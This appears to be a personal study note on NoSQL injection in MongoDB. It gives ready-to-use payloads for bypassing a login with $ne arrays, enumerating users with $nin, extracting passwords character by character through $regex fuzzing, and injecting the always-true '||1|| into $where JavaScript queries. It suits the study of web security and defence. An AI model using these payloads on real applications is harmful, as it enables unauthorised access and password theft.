#NoSQL #MongoDB #WebInjection 
# NoSQL injection types

There are two main types of NoSQL Injection:

- **Syntax Injection** - This is similar to SQL injection, where we have the ability to break out of the query and inject our own payload. The key difference to SQL injection is the syntax used to perform the injection attack.

- **Operator Injection**—Even if we can't break out of the query, we could potentially inject a NoSQL query operator that manipulates the query's behaviour, allowing us to stage attacks such as authentication bypasses.

***ALL Below examples are for MongoDB***

---
# Operator Injection

#### Bypassing login screen

If we can identify the filter that passes **raw user input** : `['username'=>$user, 'password'=>$pass]`

 - Send an array to the **$user and $pass** variables with the following content:  

	`$user = ['$ne'=>'xxxx']` 
	`$pass = ['$ne'=>'yyyy']` 

The resulting filter would end up looking like this:  
`['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]`

! **We need to pass an array as part of a POST HTTP Request**.
- In PHP and other languages : `user[$ne]=xxxx&pass[$ne]=yyyy` can be used in the request body.

***This will log in as first available user*** 

#### Finding Users

To find other users than the first one we log in with:

`['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']]`
 - This return any user for whom the username isn't *admin* and the password isn't *aweasdf*.


We continue enumeration :

`['username'=>['$nin'=>['admin', 'jude'] ], 'password'=>['$ne'=>'aweasdf']]`

#### Extracting Passwords

To do this we will be abusing the **$regex** operator

- Take a *existing User* with username 
- First *guess length of password*
- Then *guess content of password*

```HTTP
user=admin&password[$regex]=^.{LENGTH_TO_TEST}$ 
```
Let's say it is of *length 5*

```HTTP
user=admin&password[$regex]=^a....$
```
```HTTP
user=admin&password[$regex]=^b....$
```
 And we continue fuzzing ...

---

# Syntax Injection

#### Detection

Use a `'` after a normal input to see if it generates a error.
Even *without verbose error messages*, we could test for Syntax Injection by providing both a false and true condition and seeing that the output differs

```shell
Please provide the username to receive their email:admin' && 0 && 'x

Please provide the username to receive their email:admin' && 1 && 'x
admin@nosql.int

```
#### Exploitation

A Program fetches emails using usernames :

```js
for x in mycol.find({"$where": "this.username == '" + username + "'"}):
```

To exploit we send a condition that **always evaluates to TRUE** in JavaScript: `'||1||'`

Note : **For Syntax Injection to occur, the developer has to create custom JavaScript queries.** The same function could be performed using the built-in filter functions where `['username' : username]` would return the same result but not be vulnerable to injection

 ---
# Tools

[[(3) NoSQL Injection - Tools|Tools]]